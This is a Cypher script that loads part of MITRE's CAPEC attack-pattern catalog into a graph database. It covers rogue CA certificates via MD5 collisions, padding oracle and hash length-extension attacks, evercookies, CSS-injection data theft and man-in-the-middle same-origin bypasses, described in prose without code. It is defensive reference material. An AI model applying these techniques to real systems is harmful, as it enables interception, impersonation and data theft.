MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 274});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 82, name: "Modification of Existing Components with Counterfeit Hardware"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 392, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-452 : Malicious Logic Insertion into Product Hardware. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 455, name: "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 399});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 275});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 276});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 83, name: "Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 393, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-457 : Malicious Logic Insertion into Product Hardware. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 456, name: "Malicious Logic Insertion into Product Memory", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 400});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 277});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, References"});
CREATE (:Description{id: 394, summary: "OrderedDict([('Text', 'An attacker inserts malicious logic into memory enabling them to achieve a negative impact.')])"});
CREATE (:AttackPattern{id: 457, name: "USB Memory Attacks", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:AttackPrerequisite{id: 318, text: "<div level=\"0\">\n  <p class=\"text\">Some level of physical access to the device being attacked.</p>\n</div>"});
CREATE (:Submission{id: 401});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 278});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Description{id: 395, summary: "OrderedDict([('Text', 'An attacker loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.457.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
CREATE (:AttackPattern{id: 458, name: "Flash Memory Attacks", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 402});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 396, summary: "OrderedDict([('Text', 'An attacker inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device. Such attacks are very difficult to detect because the malicious code resides outside the filesystem or RAM, and in the underlying byte-code that drives the processor. Many devices, such as the recent attacks against digital picture frames, contain only a microprocessor and a small amount of solid-state memory, rendering these devices ideal for \"flash\" based malware or malicious logic. One of the pernicious characteristics of flash memory based attacks is that the malicious code can survive even a total format of the hard-drive and reinstallation of the host operating system. Virtually any device which can be integrated into a computer system is susceptible to these attacks. Additionally, any peripheral device which interfaces with the computer bus could extract or sniff confidential data, even on systems employing full-disk encryption. Trojan code placed into a video card\\'s chipset would continue to perform its function irrespective of the host operating system, and would be invisible to all known antivirus. The threats extend to consumer products such as camcorders, digital cameras, or any consumer electronic device with an embedded microcontroller.')])"});
MERGE (:Reference{id: "REF-31", local_id: "R.458.1", author: "Information Technology Laboratory", title: "Supply Chain Risk Management (SCRM)", publisher: "National Institute of Standards and Technology (NIST)", pubdate: "2010"});
MERGE (:Reference{local_id: "R.458.2", author: "Robert Lemos", title: "Researchers: Rootkits headed for BIOS", publisher: "SecurityFocus", pubdate: "2006"});
CREATE (:AttackPattern{id: 459, name: "Creating a Rogue Certification Authority Certificate", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 319, text: "<div level=\"0\">\n  <p class=\"text\">Certification Authority is using the MD5 hash function to generate the certificate hash to be signed</p>\n</div>"});
CREATE (:Submission{id: 403});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 279});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 84, name: "Creating a Rogue Certificate Authority Certificate"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 397, summary: "OrderedDict([('Text', ['An adversary exploits a weakness in the MD5 hash algorithm (weak collision resistance) to generate a certificate signing request (CSR) that contains collision blocks in the \"to be signed\" part. The adversary specially crafts two different, but valid X.509 certificates that when hashed with the MD5 algorithm would yield the same value. The adversary then sends the CSR for one of the certificates to the Certification Authority which uses the MD5 hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key. An adversary then takes that signed blob and inserts it into another X.509 certificate that the attacker generated. Due to the MD5 collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate.', \"The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority. To make the attack more interesting, the second certificate could be not just a regular certificate, but rather itself a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attackers' first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will now the Certificate Authority set up by the adversary and of course any certificates that it signs. So the adversary is now able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec) .\"])])"});
MERGE (:Reference{local_id: "R.459.1", author: "['Alexander Sotirov', 'Marc Stevens', 'Jacob Appelbaum', 'Arjen Lenstra', 'David Molnar', 'Dag Arne Osvik', 'Benne de Weger']", title: "MD5 Considered Harmful Today: Creating a Rogue CA Certificate", publisher: "Phreedom.org", pubdate: "2008-12-30", link: "http://www.phreedom.org/research/rogue-ca/"});
MERGE (:CWE{id: 327});
MERGE (:CWE{id: 295});
MERGE (:CWE{id: 290});
CREATE (:AttackPattern{id: 46, name: "Overflow Variables and Tags", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 320, text: "<div level=\"0\">\n  <p class=\"text\">The target program consumes user-controllable data in the form of tags or variables.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 321, text: "<div level=\"0\">\n  <p class=\"text\">The target program does not perform sufficient boundary checking.</p>\n</div>"});
CREATE (:Submission{id: 404});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 398, summary: "OrderedDict([('Text', 'This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The attacker crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker modifies a tag or variable from a formatted configuration data. For instance she changes it to an oversized string.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The target program consumes the data modified by the attacker without prior boundary checking. As a consequence, a buffer overflow occurs and at worst remote code execution may follow.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.46.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.46.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 733});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 460, name: "HTTP Parameter Pollution (HPP)", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 322, text: "<div level=\"0\">\n  <p class=\"text\">HTTP protocol is used with some GET/POST parameters passed</p>\n</div>"});
CREATE (:Submission{id: 405});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 399, summary: "OrderedDict([('Text', 'An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.')])"});
MERGE (:Reference{local_id: "R.460.1", author: "['Luca Carettoni', 'Stefano di Paola']", title: "HTTP Parameter Pollution", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2008", link: "https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf"});
MERGE (:CWE{id: 88});
MERGE (:CWE{id: 147});
MERGE (:CWE{id: 235});
CREATE (:ResourcesRequired{id: 219, text: "<div level=\"0\">\n  <p class=\"text\">Any tool that enables intercepting and tampering with HTTP requests</p>\n</div>"});
CREATE (:AttackPattern{id: 461, name: "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 323, text: "<div level=\"0\">\n  <p class=\"text\">Web services check the signature of the API calls</p>\n  <p class=\"text\">Authentication tokens / secrets are shared between the server and the legitimate client</p>\n  <p class=\"text\">The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.</p>\n  <p class=\"text\">An iterative hash function like MD5 and SHA1 is used.</p>\n  <p class=\"text\">An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.</p>\n  <p class=\"text\">The communication channel between the client and the server is not secured via channel security such as TLS</p>\n</div>"});
CREATE (:Submission{id: 406});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 400, summary: "OrderedDict([('Text', \"When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller when constructing a request would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash. For instance, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) II M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work just as well with another hash function like SHA1.\")])"});
MERGE (:Reference{local_id: "R.461.1", author: "['Thai Duong', 'Juliano Rizzo']", title: "Flickr's API Signature Forgery Vulnerability", pubdate: "September 28, 2009", link: "http://netifera.com/research/flickr_api_signature_forgery.pdf"});
MERGE (:CWE{id: 328});
MERGE (:CWE{id: 290});
CREATE (:ResourcesRequired{id: 220, text: "<div level=\"0\">\n  <p class=\"text\">Access to a function to produce a hash (e.g., MD5, SHA1)</p>\n  <p class=\"text\">Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes</p>\n</div>"});
CREATE (:AttackPattern{id: 462, name: "Cross-Domain Search Timing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 324, text: "<div level=\"0\">\n  <p class=\"text\">Ability to issue GET / POST requests cross domain</p>\n  <p class=\"text\">Java Script is enabled in the victim's browser</p>\n  <p class=\"text\">The victim has an active session with the site from which the attacker would like to receive information</p>\n  <p class=\"text\">The victim's site does not protect search functionality with cross site request forgery (CSRF) protection</p>\n</div>"});
CREATE (:Submission{id: 407});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 280});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 281});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 401, summary: "OrderedDict([('Text', [\"An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.\", 'For GET requests an attacker could for instance leverage the \"img\" tag in conjunction with \"onload() / onerror()\" javascript events. For the POST requests, an attacker could leverage the \"iframe\" element and leverage the \"onload()\" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers\\' cross domain requests.', \"The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information.\"])])"});
MERGE (:Reference{local_id: "R.462.1", author: "Chris Evans", title: "Cross-Domain Search Timing", pubdate: "December 11, 2009", link: "http://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html"});
MERGE (:CWE{id: 385});
MERGE (:CWE{id: 352});
MERGE (:CWE{id: 208});
CREATE (:ResourcesRequired{id: 221, text: "<div level=\"0\">\n  <p class=\"text\">Ability to issue GET / POST requests cross domain</p>\n</div>"});
CREATE (:AttackPattern{id: 463, name: "Padding Oracle Crypto Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 325, text: "<div level=\"0\">\n  <p class=\"text\">The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation</p>\n  <p class=\"text\">The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.</p>\n  <p class=\"text\">The padding oracle remains available for enough time / for as many requests as needed for the attacker to decrypt the ciphertext.</p>\n</div>"});
CREATE (:Submission{id: 408});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 402, summary: "OrderedDict([('Text', ['An attacker is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an attacker is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an attacker is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.', 'Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the attacker. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies).', 'This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the attacker whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the attacker to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack).', 'This attack can be launched cross domain where an attacker is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating. To do so an attacker sends a request containing ciphertext to the target system. Due to the browser\\'s same origin policy, the attacker is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). For instance, this can be done using \"img\" tag plus the onerror()/onload() events. The attacker\\'s JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.'])])"});
MERGE (:Reference{local_id: "R.463.1", author: "['Juliano Rizzo', 'Thai Duong']", title: "Practical Padding Oracle Attacks", pubdate: "May 25, 2010", link: "http://usenix.org/events/woot10/tech/full_papers/Rizzo.pdf"});
MERGE (:CWE{id: 209});
MERGE (:CWE{id: 514});
MERGE (:CWE{id: 649});
MERGE (:CWE{id: 347});
MERGE (:CWE{id: 354});
MERGE (:CWE{id: 696});
CREATE (:ResourcesRequired{id: 222, text: "<div level=\"0\">\n  <p class=\"text\">Ability to detect instances where a target system is vulnerable to an oracle padding attack</p>\n  <p class=\"text\">Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key</p>\n</div>"});
CREATE (:AttackPattern{id: 464, name: "Evercookie", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 326, text: "<div level=\"0\">\n  <p class=\"text\">The victim's browser is not configured to reject all cookies</p>\n  <p class=\"text\">The victim visits a website that serves the attackers' evercookie</p>\n</div>"});
CREATE (:Submission{id: 409});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 282});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 403, summary: "OrderedDict([('Text', [\"An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places to include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others.\", \"When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.\"])])"});
MERGE (:Reference{local_id: "R.464.1", author: "Samy Kamkar", title: "Evercookie", pubdate: "September 9, 2010", link: "http://samy.pl/evercookie/"});
MERGE (:CWE{id: 359});
CREATE (:ResourcesRequired{id: 223, text: "<div level=\"0\">\n  <p class=\"text\">Evercookie source code</p>\n</div>"});
CREATE (:AttackPattern{id: 465, name: "Transparent Proxy Abuse", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 327, text: "<div level=\"0\">\n  <p class=\"text\">Transparent proxy is used</p>\n  <p class=\"text\">Vulnerable configuration of network topology involving the transparent proxy (e.g., no NAT happening between the client and the proxy)</p>\n  <p class=\"text\">Execution of malicious Flash or Applet in the victim's browser</p>\n</div>"});
CREATE (:Submission{id: 410});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 283});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 85, name: "Socket Capable Browser Plugins Result In Transparent Proxy Abuse"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 404, summary: "OrderedDict([('Text', ['A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client. Transparent proxies are often used by enterprises and ISPs.', \"For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination.\", \"A browser has same origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's same origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy.\"])])"});
MERGE (:Reference{local_id: "R.465.1", author: "Robert Auger", title: "Socket Capable Browser Plugins Result In Transparent Proxy Abuse", pubdate: "2009", link: "http://www.thesecuritypractice.com/the_security_practice/TransparentProxyAbuse.pdf"});
MERGE (:CWE{id: 441});
CREATE (:AttackPattern{id: 466, name: "Leveraging Active Man in the Middle Attacks to Bypass Same Origin Policy", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 328, text: "<div level=\"0\">\n  <p class=\"text\">The victim and the attacker are both in an environment where an active man in the middle attack is possible (e.g., public WIFI hot spot)</p>\n  <p class=\"text\">The victim visits at least one website that does not use TLS / SSL</p>\n</div>"});
CREATE (:Submission{id: 411});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 405, summary: "OrderedDict([('Text', [\"An attacker leverages a man in the middle attack in order to bypass the same origin policy protection in the victim's browser. This active man in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS. For instance, the victim may be checking flight or weather information.\", \"When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The same origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active man in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive functionality. Any persistent cookies that the victim has in his or her browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality.\", \"When the site with sensitive functionality responds back to the victim's request, an active man in the middle attacker intercepts these responses, injects his or her own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can essentially be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires.\", \"The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks).\", 'An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well.'])])"});
MERGE (:Reference{local_id: "R.466.1", author: "['Roi Saltzman', 'Adi Sharabani']", title: "Active Man in the Middle Attacks", publisher: "IBM Rational Application Security Group", pubdate: "February 2, 2009", link: "http://blog.watchfire.com/wfblog/2009/02/active-man-in-the-middle-attacks.html"});
MERGE (:CWE{id: 300});
CREATE (:AttackPattern{id: 467, name: "Cross Site Identification", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 329, text: "<div level=\"0\">\n  <p class=\"text\">The victim has an active session with the social networking site.</p>\n</div>"});
CREATE (:Submission{id: 412});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 406, summary: "OrderedDict([('Text', ['An attacker harvests identifying information about a victim via an active session that the victim\\'s browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the \"remember me\" feature to keep his or her session with the social networking site active. An attacker induces a payload to execute in the victim\\'s browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).', \"In one example of an attack, an attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in his or her browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site. There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link.\", 'This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim.'])])"});
MERGE (:Reference{local_id: "R.467.1", author: "Ronen", title: "Cross Site Identification - or - How your social network might expose you when you least expect it", pubdate: "December 27, 2009", link: "http://blog.quaji.com/2009/12/out-of-context-information-disclosure.html"});
MERGE (:CWE{id: 352});
MERGE (:CWE{id: 359});
CREATE (:AttackPattern{id: 468, name: "Generic Cross-Browser Cross-Domain Theft", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 330, text: "<div level=\"0\">\n  <p class=\"text\">No new lines can be present in the injected CSS string</p>\n  <p class=\"text\">Proper HTML or URL escaping of the \" and ' characters is not present</p>\n  <p class=\"text\">The attacker has control of two injection points: pre-string and post-string</p>\n</div>"});
CREATE (:Submission{id: 413});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 284});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 285});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 407, summary: "OrderedDict([('Text', [\"An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser\", \"By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string.\", 'If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that \"does not make sense\". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain.', 'The stolen data may contain sensitive information, such CSRF protection tokens.'])])"});
MERGE (:Reference{local_id: "R.468.1", author: "Chris Evans", title: "Generic cross-browser cross-domain theft", pubdate: "December 28, 2009", link: "http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html"});
MERGE (:CWE{id: 707});
MERGE (:CWE{id: 149});
MERGE (:CWE{id: 177});
MERGE (:CWE{id: 838});
